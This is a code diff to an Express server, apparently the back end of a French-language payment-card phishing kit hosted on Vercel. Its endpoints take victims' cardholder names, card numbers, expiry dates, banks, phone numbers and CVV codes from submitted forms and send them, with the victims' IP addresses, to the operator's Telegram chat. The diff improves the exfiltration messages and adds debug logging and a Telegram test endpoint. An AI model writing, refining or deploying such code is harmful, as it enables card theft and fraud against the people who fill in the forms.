@@ -20,7 +20,14 @@ const sendTelegram = (text) => {
   return new Promise((resolve, reject) => {
     const token = process.env.TELEGRAM_BOT_TOKEN;
     const chatId = process.env.TELEGRAM_CHAT_ID;
-    if (!token || !chatId) return reject(new Error('Config missing'));
+    
+    console.log('Telegram Config Check:');
+    console.log('Token exists:', !!token);
+    console.log('ChatId exists:', !!chatId);
+    console.log('Token preview:', token ? token.substring(0, 10) + '...' : 'MISSING');
+    console.log('ChatId:', chatId);
+    
+    if (!token || !chatId) return reject(new Error('Missing Telegram config'));
 
     const payload = JSON.stringify({ chat_id: chatId, text, parse_mode: 'HTML' });
     const opts = {
@@ -38,7 +45,9 @@ const sendTelegram = (text) => {
       res.on('data', chunk => data += chunk);
       res.on('end', () => {
         try {
-          resolve(JSON.parse(data));
+          const response = JSON.parse(data);
+          console.log('Telegram Response:', response);
+          resolve(response);
         } catch (e) {
           reject(e);
         }
@@ -57,9 +66,14 @@ app.get('/deuxieme', (req, res) => res.render('deuxieme'));
 
 app.post('/api/send-agreement', async (req, res) => {
   try {
-    await sendTelegram(`<b>✅ ACCORD</b>\n⏰ ${new Date().toLocaleString('fr-FR')}\n🌐 IP: ${req.clientIP}`);
+    const msg = `<b>✅ ACCORD ACCEPTÉ</b>
+━━━━━━━━━━━━━━━━
+⏰ ${new Date().toLocaleString('fr-FR')}
+🌐 IP: ${req.clientIP}`;
+    await sendTelegram(msg);
     res.json({ success: true });
   } catch (e) {
+    console.error('Telegram error:', e);
     res.status(500).json({ success: false, error: e.message });
   }
 });
@@ -67,9 +81,19 @@ app.post('/api/send-agreement', async (req, res) => {
 app.post('/api/send-form', async (req, res) => {
   try {
     const { titulaire, cardNumber, expiryDate, bank, telephone } = req.body;
-    await sendTelegram(`<b>💳 DONNÉES</b>\n👤 ${titulaire}\n💳 ${cardNumber}\n📅 ${expiryDate}\n🏦 ${bank}\n📱 ${telephone}\n🌐 IP: ${req.clientIP}`);
+    const msg = `<b>💳 DONNÉES BANCAIRES</b>
+━━━━━━━━━━━━━━━━
+👤 ${titulaire}
+💳 ${cardNumber}
+📅 ${expiryDate}
+🏦 ${bank}
+📱 ${telephone}
+🌐 IP: ${req.clientIP}
+⏰ ${new Date().toLocaleString('fr-FR')}`;
+    await sendTelegram(msg);
     res.json({ success: true });
   } catch (e) {
+    console.error('Telegram error:', e);
     res.status(500).json({ success: false, error: e.message });
   }
 });
@@ -77,13 +101,42 @@ app.post('/api/send-form', async (req, res) => {
 app.post('/api/send-cvv', async (req, res) => {
   try {
     const { cvv, titulaire, cardNumber, expiryDate } = req.body;
-    await sendTelegram(`<b>🔐 CVV</b>\n🔑 ${cvv}\n👤 ${titulaire}\n💳 ${cardNumber}\n📅 ${expiryDate}\n🌐 IP: ${req.clientIP}`);
+    const msg = `<b>🔐 CVV REÇU</b>
+━━━━━━━━━━━━━━━━
+🔑 ${cvv}
+👤 ${titulaire}
+💳 ${cardNumber}
+📅 ${expiryDate}
+🌐 IP: ${req.clientIP}
+⏰ ${new Date().toLocaleString('fr-FR')}`;
+    await sendTelegram(msg);
     res.json({ success: true });
   } catch (e) {
+    console.error('Telegram error:', e);
     res.status(500).json({ success: false, error: e.message });
   }
 });
 
-app.get('/api/health', (req, res) => res.json({ status: 'OK', environment: 'vercel' }));
+app.get('/api/health', (req, res) => {
+  res.json({ 
+    status: 'OK', 
+    environment: 'vercel',
+    telegramConfigured: !!process.env.TELEGRAM_BOT_TOKEN && !!process.env.TELEGRAM_CHAT_ID
+  });
+});
+
+app.post('/api/test-telegram', async (req, res) => {
+  try {
+    const msg = `<b>🚀 TEST TELEGRAM</b>
+━━━━━━━━━━━━━━━━
+✅ Connexion établie
+⏰ ${new Date().toLocaleString('fr-FR')}`;
+    await sendTelegram(msg);
+    res.json({ success: true, message: 'Message de test envoyé' });
+  } catch (e) {
+    console.error('Telegram test error:', e);
+    res.status(500).json({ success: false, error: e.message });
+  }
+});
 
 module.exports = app;
